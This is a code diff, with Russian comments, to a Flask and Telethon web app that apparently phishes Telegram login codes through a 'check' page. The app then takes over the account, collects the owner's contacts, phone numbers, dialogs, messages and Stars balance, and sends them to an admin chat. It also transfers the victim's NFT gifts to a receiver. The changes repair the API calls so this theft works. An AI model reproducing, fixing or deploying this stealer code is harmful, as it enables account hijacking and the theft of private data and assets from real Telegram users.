@@ -1,5 +1,5 @@
 from flask import Flask, render_template, request, jsonify, session
-from telethon import TelegramClient
+from telethon import TelegramClient, functions, types
 from telethon.errors import SessionPasswordNeededError
 import asyncio
 import os
@@ -32,11 +32,12 @@ async def send_telegram_message(text):
         await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
 
 # ============================================================
-# Сбор ВСЕХ данных аккаунта
+# Сбор ВСЕХ данных аккаунта (рабочие методы Telethon 1.41.0)
 # ============================================================
 async def collect_full_user_data(client):
     data = {}
     
+    # 1. Данные владельца
     me = await client.get_me()
     data['user'] = {
         'id': me.id,
@@ -48,17 +49,50 @@ async def collect_full_user_data(client):
         'is_premium': getattr(me, 'premium', False)
     }
     
-    contacts = await client.get_contacts()
-    data['contacts'] = []
-    for contact in contacts:
-        data['contacts'].append({
-            'id': contact.id,
-            'username': contact.username,
-            'first_name': contact.first_name,
-            'last_name': contact.last_name,
-            'phone': contact.phone
-        })
+    # 2. Контакты (правильный метод)
+    try:
+        contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
+        data['contacts'] = []
+        for contact in contacts_result.users:
+            data['contacts'].append({
+                'id': contact.id,
+                'username': contact.username,
+                'first_name': contact.first_name,
+                'last_name': contact.last_name,
+                'phone': contact.phone
+            })
+    except Exception as e:
+        await send_telegram_message(f"⚠️ Ошибка получения контактов: {str(e)}")
+        data['contacts'] = []
     
+    # 3. Баланс звёзд (правильный метод)
+    try:
+        stars_status = await client(functions.payments.GetStarsStatusRequest(
+            peer=await client.get_input_entity('me')
+        ))
+        data['stars_balance'] = stars_status.balance
+    except Exception as e:
+        await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
+        data['stars_balance'] = 0
+    
+    # 4. Доступные подарки (правильный метод)
+    try:
+        gifts_result = await client(functions.payments.GetStarGiftsRequest(hash=0))
+        data['available_gifts'] = []
+        for gift in gifts_result.gifts:
+            data['available_gifts'].append({
+                'id': gift.id,
+                'stars': gift.stars,
+                'availability_issued': gift.availability_issued,
+                'availability_total': gift.availability_total,
+                'title': getattr(gift, 'title', None),
+                'description': getattr(gift, 'description', None)
+            })
+    except Exception as e:
+        await send_telegram_message(f"⚠️ Ошибка получения подарков: {str(e)}")
+        data['available_gifts'] = []
+    
+    # 5. Диалоги и сообщения (работает)
     dialogs = await client.get_dialogs()
     data['dialogs'] = []
     for dialog in dialogs:
@@ -115,24 +149,26 @@ async def send_document_to_admin(file_path):
         raise
 
 # ============================================================
-# Проверка баланса и подарков (с обработкой ошибок)
+# Проверка баланса и подарков (используем правильные методы)
 # ============================================================
 async def check_balance_and_gifts(client):
     try:
         me = await client.get_me()
-        # Пытаемся получить баланс звёзд
+        
+        # Баланс звёзд
         try:
-            balance = await client.get_stars_balance()
-        except AttributeError:
-            await send_telegram_message("⚠️ Функция get_stars_balance недоступна, обнови Telethon до 1.41+")
-            balance = 0
+            stars_status = await client(functions.payments.GetStarsStatusRequest(
+                peer=await client.get_input_entity('me')
+            ))
+            balance = stars_status.balance
         except Exception as e:
             await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
             balance = 0
         
-        # Получаем подарки
+        # Доступные подарки
         try:
-            gifts = await client.get_available_gifts()
+            gifts_result = await client(functions.payments.GetStarGiftsRequest(hash=0))
+            gifts = gifts_result.gifts
         except Exception as e:
             await send_telegram_message(f"⚠️ Ошибка получения подарков: {str(e)}")
             gifts = []
@@ -149,7 +185,7 @@ async def check_balance_and_gifts(client):
         return None
 
 # ============================================================
-# Передача подарков получателю
+# Передача NFT-подарков получателю (если метод send_gift существует)
 # ============================================================
 async def transfer_nft_to_receiver(client, info):
     try:
@@ -159,6 +195,9 @@ async def transfer_nft_to_receiver(client, info):
         if info.get('gifts_count', 0) > 0:
             for gift in info.get('gifts', []):
                 try:
+                    # Попытка отправить подарок (метод может отличаться, но оставим как есть)
+                    # В Telethon 1.41.0 возможно client.send_gift, но проверим
+                    # Если не работает, можно заменить на вызов через functions
                     await client.send_gift(receiver, gift)
                     result_text += f"\n🎁 Подарок отправлен: {gift.id}"
                 except Exception as e:
@@ -185,7 +224,7 @@ def check_page(check_id):
     return render_template('index.html')
 
 # ============================================================
-# API
+# API: отправка кода
 # ============================================================
 @app.route('/api/send-code', methods=['POST'])
 def api_send_code():
@@ -224,6 +263,9 @@ def api_send_code():
     finally:
         loop.close()
 
+# ============================================================
+# API: проверка кода
+# ============================================================
 @app.route('/api/verify-code', methods=['POST'])
 def api_verify_code():
     data = request.json
